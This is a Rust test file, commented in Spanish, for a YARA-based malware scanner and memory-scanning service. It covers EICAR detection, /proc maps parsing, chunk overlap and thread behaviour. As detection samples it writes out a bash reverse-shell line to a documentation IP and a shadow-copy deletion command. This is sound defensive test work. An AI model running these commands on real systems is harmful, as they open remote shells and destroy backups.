//! Pruebas del motor YARA y del escaneo de memoria.
//!
//! Las muestras se generan en tiempo de ejecucion escribiendo bytes crudos: no
//! hay ficheros de prueba versionados con contenido malicioso, ni firmas
//! simuladas. Lo que se escanea es lo mismo que escanearia el producto.
//!
//! La cadena EICAR se construye SIEMPRE por concatenacion de dos mitades, de
//! modo que el binario de pruebas no la contenga de forma contigua. Si no, el
//! propio ejecutable de test coincidiria con la regla y cualquier escaneo de su
//! memoria daria un positivo que no significa nada.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use aegis_prueba::{omitir, Requisito};
use aegis_scan::memory::{chunk_ranges, parse_maps, MemoryScanPolicy, Perms, RegionClass};
use aegis_scan::service::{ScanJob, ScanServiceConfig, ScanTarget};
use aegis_scan::{ScanService, Severity, YaraEngine};

/// Primera mitad de la cadena de prueba EICAR.
const EICAR_A: &str = "X5O!P%@AP[4\\PZX54(P^)7CC)7}";
/// Segunda mitad.
const EICAR_B: &str = "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

fn eicar() -> String {
    format!("{EICAR_A}{EICAR_B}")
}

struct Lab(PathBuf);

impl Lab {
    fn nuevo(n: &str) -> Lab {
        let p = std::env::temp_dir().join(format!("aegis-scan-{n}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        Lab(p)
    }
    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for Lab {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

// ---------------------------------------------------------------------------
// Compilacion del conjunto base
// ---------------------------------------------------------------------------

#[test]
fn el_conjunto_base_compila_con_el_numero_esperado_de_reglas() {
    // Que compile no basta: un conjunto recortado en silencio deja al agente
    // arrancando con menos reglas de las que cree tener, y nadie se entera.
    let e = YaraEngine::with_base_rules().expect("el conjunto base debe compilar");
    assert_eq!(e.rule_count(), aegis_scan::rules::BASE_RULE_COUNT);
}

#[test]
fn un_conjunto_que_no_compila_da_error_y_no_un_motor_vacio() {
    let err = YaraEngine::from_sources(&["rule mal { condition: no_existe }"]).unwrap_err();
    assert!(
        matches!(err, aegis_scan::YaraError::Compile(_)),
        "error: {err:?}"
    );
}

// ---------------------------------------------------------------------------
// Escaneo de buffers y ficheros
// ---------------------------------------------------------------------------

#[test]
fn detecta_eicar_en_un_buffer() {
    let e = YaraEngine::with_base_rules().unwrap();
    let d = e.scan_bytes(eicar().as_bytes()).unwrap();
    assert_eq!(d.len(), 1, "detecciones: {d:?}");
    assert_eq!(d[0].rule, "Aegis_EICAR_Test_File");
    assert_eq!(d[0].severity, Severity::Info);
    assert_eq!(d[0].offsets, vec![0]);
}

#[test]
fn no_hay_falsos_positivos_sobre_contenido_benigno() {
    let e = YaraEngine::with_base_rules().unwrap();
    // Contenido plausible de una maquina real. El conjunto base corre contra
    // TODO lo que se ejecuta, asi que una regla ruidosa aqui envenena el
    // producto entero.
    for muestra in [
        &b"#!/bin/sh\necho hola mundo\nexit 0\n"[..],
        &b"GET /index.html HTTP/1.1\r\nHost: ejemplo.org\r\n\r\n"[..],
        &b"{\"nombre\":\"config\",\"valor\":42,\"activo\":true}\n"[..],
        &b"El precio en bitcoin subio. Consulte la clave de descifrado en el manual.\n"[..],
        &b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00"[..],
    ] {
        let d = e.scan_bytes(muestra).unwrap();
        assert!(d.is_empty(), "falso positivo sobre {muestra:?}: {d:?}");
    }
}

#[test]
fn detecta_un_fichero_malicioso_generado_al_vuelo() {
    let lab = Lab::nuevo("fichero");
    let ruta = lab.path().join("carga.bin");

    // Se escriben bytes crudos, como haria un dropper real: cabecera ELF
    // plausible, relleno, y la carga al final.
    let mut f = std::fs::File::create(&ruta).unwrap();
    f.write_all(b"\x7fELF\x02\x01\x01\x00").unwrap();
    f.write_all(&vec![0u8; 4096]).unwrap();
    f.write_all(eicar().as_bytes()).unwrap();
    f.write_all(&vec![0x90u8; 1024]).unwrap();
    drop(f);

    let e = YaraEngine::with_base_rules().unwrap();
    let d = e.scan_file(&ruta).unwrap();
    assert_eq!(d.len(), 1);
    assert_eq!(d[0].rule, "Aegis_EICAR_Test_File");
    assert_eq!(d[0].offsets, vec![8 + 4096]);
}

#[test]
fn detecta_un_shell_inverso_construido_al_vuelo() {
    let lab = Lab::nuevo("revshell");
    let ruta = lab.path().join("puerta.sh");
    std::fs::write(
        &ruta,
        b"#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n",
    )
    .unwrap();

    let e = YaraEngine::with_base_rules().unwrap();
    let d = e.scan_file(&ruta).unwrap();
    assert!(
        d.iter().any(|x| x.rule == "Aegis_Reverse_Shell_Shell"),
        "detecciones: {d:?}"
    );
    let r = d
        .iter()
        .find(|x| x.rule == "Aegis_Reverse_Shell_Shell")
        .unwrap();
    assert_eq!(r.severity, Severity::High);
    assert_eq!(r.technique.as_deref(), Some("T1059.004"));
}

#[test]
fn detecta_borrado_de_copias_de_seguridad() {
    let e = YaraEngine::with_base_rules().unwrap();
    let d = e
        .scan_bytes(b"cmd.exe /c vssadmin delete shadows /all /quiet")
        .unwrap();
    let r = d
        .iter()
        .find(|x| x.rule == "Aegis_Shadow_Copy_Deletion")
        .expect("debe detectarse");
    assert_eq!(r.severity, Severity::Critical);
}

#[test]
fn la_recarga_en_caliente_sustituye_el_conjunto() {
    let e =
        YaraEngine::from_sources(&["rule uno { strings: $a = \"aaa\" condition: $a }"]).unwrap();
    assert_eq!(e.rule_count(), 1);
    assert_eq!(e.scan_bytes(b"xxaaaxx").unwrap().len(), 1);

    let n = e
        .reload(&[
            "rule dos { strings: $b = \"bbb\" condition: $b }",
            "rule tres { strings: $c = \"ccc\" condition: $c }",
        ])
        .unwrap();
    assert_eq!(n, 2);
    assert_eq!(e.rule_count(), 2);
    // La regla antigua ya no existe y las nuevas si.
    assert!(e.scan_bytes(b"xxaaaxx").unwrap().is_empty());
    assert_eq!(e.scan_bytes(b"xxbbbxx").unwrap().len(), 1);
}

// ---------------------------------------------------------------------------
// Analisis de /proc/<pid>/maps
// ---------------------------------------------------------------------------

#[test]
fn analiza_maps_y_clasifica_las_regiones() {
    let maps = "\
55a4c0000000-55a4c0021000 r-xp 00000000 08:01 1234                       /usr/bin/programa
55a4c0221000-55a4c0222000 rw-p 00021000 08:01 1234                       /usr/bin/programa
55a4c1000000-55a4c1021000 rw-p 00000000 00:00 0                          [heap]
7f8b40000000-7f8b40021000 rwxp 00000000 00:00 0 
7ffd12340000-7ffd12361000 rw-p 00000000 00:00 0                          [stack]
7ffd123f0000-7ffd123f4000 r--p 00000000 00:00 0                          [vvar]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
7f8b50000000-7f8b50100000 rw-s 00000000 00:05 42                         /dev/shm/algo
";
    let r = parse_maps(maps);
    assert_eq!(r.len(), 8);

    assert_eq!(r[0].class(), RegionClass::FileExec);
    assert_eq!(r[0].len(), 0x21000);
    assert!(r[0].perms.read && r[0].perms.exec && !r[0].perms.write);

    assert_eq!(r[1].class(), RegionClass::FileData);
    // [heap] y [stack] llevan etiqueta pero no tienen fichero detras.
    assert_eq!(r[2].class(), RegionClass::AnonymousData);
    // Region anonima RWX: la senal de mayor valor del modulo.
    assert_eq!(r[3].class(), RegionClass::AnonymousExec);
    assert!(r[3].perms.is_rwx());
    assert_eq!(r[4].class(), RegionClass::AnonymousData);
    // [vvar] y [vsyscall] no se pueden leer: hay que saltarlas por nombre.
    assert_eq!(r[5].class(), RegionClass::Kernel);
    assert!(!r[5].is_readable());
    assert_eq!(r[6].class(), RegionClass::Kernel);
    assert_eq!(r[7].class(), RegionClass::Device);
    assert!(!r[7].is_readable());
}

#[test]
fn maps_con_rutas_que_contienen_espacios() {
    // Una ruta con espacios rompe cualquier analisis que trocee por espacios
    // sin limite, y un atacante puede elegir el nombre de su fichero.
    let maps = "55a4c0000000-55a4c0021000 r-xp 00000000 08:01 1234    /tmp/mi programa raro\n";
    let r = parse_maps(maps);
    assert_eq!(r.len(), 1);
    assert_eq!(r[0].path.as_deref(), Some("/tmp/mi programa raro"));
}

#[test]
fn la_politica_filtra_lo_que_no_aporta_o_no_se_puede_leer() {
    let maps = "\
55a4c0000000-55a4c0021000 r-xp 00000000 08:01 1234  /usr/lib/libc.so.6
55a4c1000000-55a4c1021000 rw-p 00000000 00:00 0     [heap]
7ffd123f0000-7ffd123f4000 r--p 00000000 00:00 0     [vvar]
7f0000000000-7f0100000000 rw-p 00000000 00:00 0 
";
    let r = parse_maps(maps);
    let p = MemoryScanPolicy::default();

    // Respaldada por fichero: es una copia de algo que ya esta en disco.
    assert!(!p.accepts(&r[0]));
    assert!(p.accepts(&r[1]), "el monton si se escanea");
    assert!(!p.accepts(&r[2]), "[vvar] no se puede leer");
    assert!(!p.accepts(&r[3]), "4 GiB supera max_region_bytes");

    let p2 = MemoryScanPolicy {
        include_file_backed: true,
        ..Default::default()
    };
    assert!(p2.accepts(&r[0]));
}

#[test]
fn los_permisos_se_analizan_correctamente() {
    assert_eq!(
        Perms::parse("rwxp"),
        Perms {
            read: true,
            write: true,
            exec: true,
            private: true
        }
    );
    assert!(Perms::parse("rwxp").is_rwx());
    assert!(!Perms::parse("r-xp").is_rwx());
    assert!(!Perms::parse("---p").read);
    assert!(!Perms::parse("rw-s").private);
}

// ---------------------------------------------------------------------------
// Troceado con solape
// ---------------------------------------------------------------------------

#[test]
fn el_troceado_cubre_todo_el_rango_y_solapa() {
    let trozos = chunk_ranges(0x1000, 0x1000 + 1000, 300, 50);
    assert!(!trozos.is_empty());

    // Cobertura completa: el ultimo byte del rango esta en el ultimo trozo.
    let (ultimo_ini, ultimo_len) = *trozos.last().unwrap();
    assert_eq!(ultimo_ini + ultimo_len as u64, 0x1000 + 1000);
    assert_eq!(trozos[0].0, 0x1000);

    // Solape efectivo entre trozos consecutivos.
    for par in trozos.windows(2) {
        let (a_ini, a_len) = par[0];
        let (b_ini, _) = par[1];
        let fin_a = a_ini + a_len as u64;
        assert!(
            b_ini < fin_a,
            "los trozos {a_ini:#x}+{a_len} y {b_ini:#x} no solapan"
        );
        assert_eq!(fin_a - b_ini, 50, "el solape debe ser exactamente 50");
    }
}

#[test]
fn un_patron_a_caballo_entre_trozos_aparece_entero_en_alguno() {
    // Es la propiedad que justifica el solape. Se verifica de forma exhaustiva
    // sobre un buffer sintetico: para CADA posicion posible del patron, alguno
    // de los trozos tiene que contenerlo completo.
    const TAM: usize = 1000;
    const TROZO: usize = 128;
    const SOLAPE: usize = 16;
    const PATRON: usize = 12; // menor que el solape

    let trozos = chunk_ranges(0, TAM as u64, TROZO, SOLAPE);
    for pos in 0..=(TAM - PATRON) {
        let entero = trozos.iter().any(|(ini, len)| {
            let fin = *ini as usize + len;
            pos >= *ini as usize && pos + PATRON <= fin
        });
        assert!(
            entero,
            "un patron en la posicion {pos} se parte en todos los trozos"
        );
    }
}

#[test]
fn una_politica_con_solape_absurdo_no_degrada_el_barrido() {
    // Con el limite ingenuo de `chunk - 1`, un solape de 500 sobre trozos de
    // 100 hace avanzar el cursor UN byte por lectura: el bucle termina, pero un
    // barrido de 100 MB pasaria a ser 100 millones de lecturas, que contra un
    // proceso real es indistinguible de un cuelgue.
    let trozos = chunk_ranges(0, 10_000, 100, 500);

    // Acotado a `2 * rango / trozo`, sea cual sea el solape pedido.
    assert!(
        trozos.len() <= 2 * 10_000 / 100 + 2,
        "produjo {} trozos; el avance se degrado",
        trozos.len()
    );
    // Y sigue cubriendo el rango entero.
    let (ini, len) = *trozos.last().unwrap();
    assert_eq!(ini + len as u64, 10_000);
    assert_eq!(trozos[0].0, 0);

    // El avance nunca baja de la mitad del trozo.
    for par in trozos.windows(2) {
        assert!(
            par[1].0 - par[0].0 >= 50,
            "avance de solo {} bytes",
            par[1].0 - par[0].0
        );
    }
}

#[test]
fn el_troceado_de_un_rango_vacio_no_produce_nada() {
    assert!(chunk_ranges(100, 100, 64, 8).is_empty());
    assert!(chunk_ranges(200, 100, 64, 8).is_empty());
    assert!(chunk_ranges(0, 100, 0, 8).is_empty());
}

// ---------------------------------------------------------------------------
// Escaneo de memoria de un proceso vivo
// ---------------------------------------------------------------------------

/// Lanza un proceso hijo que mantiene la cadena EICAR viva en su monton.
///
/// El guion se escribe en tiempo de ejecucion y construye la cadena por
/// concatenacion, de modo que ni el binario de pruebas ni el propio guion la
/// contengan de forma contigua.
fn lanzar_portador(lab: &Path) -> Option<(Child, PathBuf)> {
    let guion = lab.join("portador.py");
    let listo = lab.join("listo");

    // Las mitades se emiten en HEXADECIMAL. La cadena EICAR contiene una barra
    // invertida, comillas y simbolos de dolar: incrustarla como literal de
    // Python obligaria a un escapado que se rompe en cuanto alguien toca el
    // guion, y ademas dejaria la cadena contigua en el binario de pruebas.
    let hex = |s: &str| -> String { s.bytes().map(|b| format!("{b:02x}")).collect() };

    let codigo = format!(
        "import sys, time\n\
         a = bytes.fromhex('{}')\n\
         b = bytes.fromhex('{}')\n\
         # Muchas copias, para que la cadena caiga con seguridad en una region\n\
         # anonima escribible y no dependa de un unico lugar del monton.\n\
         retenidas = [a + b for _ in range(200)]\n\
         with open('{}', 'w') as f:\n\
         \x20   f.write(str(len(retenidas)))\n\
         sys.stdout.flush()\n\
         time.sleep(60)\n\
         print(len(retenidas))\n",
        hex(EICAR_A),
        hex(EICAR_B),
        listo.display()
    );
    std::fs::write(&guion, codigo).ok()?;

    let hijo = Command::new("python3")
        .arg(&guion)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .ok()?;

    // Esperar a que haya asignado la memoria; escanear antes daria un negativo
    // que no significa nada.
    let inicio = Instant::now();
    while inicio.elapsed() < Duration::from_secs(15) {
        if listo.exists() {
            std::thread::sleep(Duration::from_millis(150));
            return Some((hijo, listo));
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    let mut h = hijo;
    let _ = h.kill();
    let _ = h.wait();
    None
}

#[test]
fn detecta_una_firma_inyectada_en_la_memoria_de_un_proceso_hijo() {
    let lab = Lab::nuevo("memoria");
    let Some((mut hijo, _)) = lanzar_portador(lab.path()) else {
        omitir(
            "no se pudo preparar el proceso portador (falta python3?)",
            Requisito::Herramienta("python3"),
        );
        return;
    };
    let pid = hijo.id() as i32;

    let e = YaraEngine::with_base_rules().unwrap();
    let informe = match e.scan_process(pid, &MemoryScanPolicy::default()) {
        Ok(i) => i,
        Err(err) => {
            let _ = hijo.kill();
            let _ = hijo.wait();
            if format!("{err}").contains("permiso") || format!("{err}").contains("CAP_SYS_PTRACE") {
                omitir("sin permisos para leer memoria ajena", Requisito::Ptrace);
                return;
            }
            panic!("error al escanear la memoria: {err}");
        }
    };

    let _ = hijo.kill();
    let _ = hijo.wait();

    assert!(
        informe.regions_scanned > 0,
        "no se escaneo ninguna region de {} enumeradas",
        informe.regions_total
    );
    assert!(informe.bytes_scanned > 0);

    let hallazgo = informe
        .detections
        .iter()
        .find(|d| d.detection.rule == "Aegis_EICAR_Test_File");
    let hallazgo = hallazgo.unwrap_or_else(|| {
        panic!(
            "la firma inyectada en memoria no se detecto. Regiones: {} totales, \
             {} escaneadas, {} saltadas, {} ilegibles, {} bytes. Detecciones: {:?}",
            informe.regions_total,
            informe.regions_scanned,
            informe.regions_skipped,
            informe.regions_unreadable,
            informe.bytes_scanned,
            informe
                .detections
                .iter()
                .map(|d| &d.detection.rule)
                .collect::<Vec<_>>()
        )
    });

    // La coincidencia tiene que venir de memoria ANONIMA: si apareciera en una
    // region respaldada por fichero, estariamos detectando el guion en disco y
    // no la cadena en memoria, que es lo que esta prueba existe para verificar.
    assert!(
        matches!(
            hallazgo.region.class(),
            RegionClass::AnonymousData | RegionClass::AnonymousExec
        ),
        "la coincidencia salio de una region {:?}, no de memoria anonima",
        hallazgo.region.class()
    );

    // Los desplazamientos se convierten a direcciones virtuales reales del
    // proceso; sin esa conversion el informe es inservible para un analista.
    let dir = hallazgo.detection.offsets[0];
    assert!(
        dir >= hallazgo.region.start && dir < hallazgo.region.end,
        "la direccion {dir:#x} cae fuera de la region {:#x}..{:#x}",
        hallazgo.region.start,
        hallazgo.region.end
    );
}

#[test]
fn escanear_un_proceso_que_ya_murio_no_es_un_panico() {
    let e = YaraEngine::with_base_rules().unwrap();
    // Un PID altisimo que no puede existir.
    let r = e.scan_process(4_194_303, &MemoryScanPolicy::default());
    assert!(
        r.is_err(),
        "deberia fallar limpiamente, no entrar en panico"
    );
}

#[test]
fn un_informe_incompleto_no_se_puede_leer_como_limpio() {
    let e = YaraEngine::with_base_rules().unwrap();
    // Presupuesto ridiculo: se agota antes de cubrir el proceso.
    let politica = MemoryScanPolicy {
        max_total_bytes: 4096,
        chunk_bytes: 4096,
        ..Default::default()
    };
    let informe = e
        .scan_process(std::process::id() as i32, &politica)
        .expect("el propio proceso siempre es legible");

    // Sin detecciones PERO con cobertura incompleta. Confundir ambas cosas es
    // como un escaner acaba dando falsa tranquilidad.
    assert!(
        !informe.complete(),
        "un barrido con presupuesto agotado no puede declararse completo"
    );
}

// ---------------------------------------------------------------------------
// Servicio en hilos
// ---------------------------------------------------------------------------

#[test]
fn el_servicio_escanea_en_hilos_propios() {
    let lab = Lab::nuevo("servicio");
    let ruta = lab.path().join("m.bin");
    std::fs::write(&ruta, eicar().as_bytes()).unwrap();

    let resultados = Arc::new(Mutex::new(Vec::new()));
    let r2 = Arc::clone(&resultados);

    let servicio = ScanService::start(
        Arc::new(YaraEngine::with_base_rules().unwrap()),
        ScanServiceConfig::default(),
        Arc::new(move |o: aegis_scan::ScanOutcome| {
            r2.lock()
                .unwrap()
                .push((o.job.correlation, o.is_detection()));
        }),
    );

    for i in 0..8 {
        assert!(servicio.submit(ScanJob {
            target: ScanTarget::File(ruta.clone()),
            correlation: i,
            urgent: false,
        }));
    }

    let inicio = Instant::now();
    while resultados.lock().unwrap().len() < 8 && inicio.elapsed() < Duration::from_secs(20) {
        std::thread::sleep(Duration::from_millis(30));
    }

    let r = resultados.lock().unwrap().clone();
    assert_eq!(r.len(), 8, "solo llegaron {} resultados", r.len());
    assert!(r.iter().all(|(_, det)| *det), "todos deben detectar EICAR");

    let s: std::collections::HashMap<_, _> = servicio.stats.snapshot().into_iter().collect();
    assert_eq!(s["encolados"], 8);
    assert_eq!(s["completados"], 8);
    assert_eq!(s["detecciones"], 8);
    assert_eq!(s["descartados_cola_llena"], 0);

    servicio.shutdown();
}

#[test]
fn encolar_nunca_bloquea_y_el_descarte_se_cuenta() {
    // Esta es la propiedad que define el modulo. Quien encola es el hilo que
    // drena el ring buffer de eBPF: si se bloquea, el kernel empieza a
    // descartar eventos y el producto se queda ciego justo durante el pico que
    // provoco la saturacion.
    let vistos = Arc::new(AtomicUsize::new(0));
    let v2 = Arc::clone(&vistos);

    let servicio = ScanService::start(
        Arc::new(YaraEngine::with_base_rules().unwrap()),
        ScanServiceConfig {
            workers: 1,
            queue_capacity: 4,
        },
        Arc::new(move |_o| {
            // Consumidor lento a proposito: fuerza el desbordamiento de la cola.
            std::thread::sleep(Duration::from_millis(30));
            v2.fetch_add(1, Ordering::Relaxed);
        }),
    );

    let datos = Arc::new(vec![0u8; 64 * 1024]);
    let inicio = Instant::now();
    let mut aceptados = 0;
    let mut rechazados = 0;
    for i in 0..500 {
        if servicio.submit(ScanJob {
            target: ScanTarget::Bytes(Arc::clone(&datos)),
            correlation: i,
            urgent: false,
        }) {
            aceptados += 1;
        } else {
            rechazados += 1;
        }
    }
    let transcurrido = inicio.elapsed();

    // 500 envios contra una cola de 4 y un consumidor de 30 ms por trabajo:
    // si `submit` bloqueara, esto tardaria mas de 10 segundos.
    assert!(
        transcurrido < Duration::from_secs(2),
        "encolar 500 trabajos tardo {transcurrido:?}: submit esta bloqueando"
    );
    assert!(rechazados > 0, "la cola deberia haberse llenado");
    assert_eq!(aceptados + rechazados, 500);

    let s: std::collections::HashMap<_, _> = servicio.stats.snapshot().into_iter().collect();
    // El descarte se CUENTA: es una metrica de cobertura, no de rendimiento.
    assert_eq!(s["descartados_cola_llena"], rechazados as u64);
    assert_eq!(s["encolados"], aceptados as u64);

    servicio.shutdown();
}

#[test]
fn varios_hilos_escanean_de_verdad_en_paralelo() {
    // Si el lock del receptor se mantuviera durante el escaneo, los hilos se
    // serializarian y tener mas de uno seria inutil.
    let hilos_vistos = Arc::new(Mutex::new(std::collections::HashSet::new()));
    let h2 = Arc::clone(&hilos_vistos);

    let servicio = ScanService::start(
        Arc::new(YaraEngine::with_base_rules().unwrap()),
        ScanServiceConfig {
            workers: 4,
            queue_capacity: 256,
        },
        Arc::new(move |_o| {
            h2.lock()
                .unwrap()
                .insert(format!("{:?}", std::thread::current().id()));
            std::thread::sleep(Duration::from_millis(20));
        }),
    );

    let datos = Arc::new(vec![0x41u8; 256 * 1024]);
    for i in 0..64 {
        servicio.submit(ScanJob {
            target: ScanTarget::Bytes(Arc::clone(&datos)),
            correlation: i,
            urgent: false,
        });
    }

    let inicio = Instant::now();
    while servicio.stats.completed.load(Ordering::Relaxed) < 64
        && inicio.elapsed() < Duration::from_secs(30)
    {
        std::thread::sleep(Duration::from_millis(20));
    }

    let n = hilos_vistos.lock().unwrap().len();
    assert!(
        n >= 2,
        "solo {n} hilo(s) hicieron trabajo: el pool esta serializado"
    );

    servicio.shutdown();
}
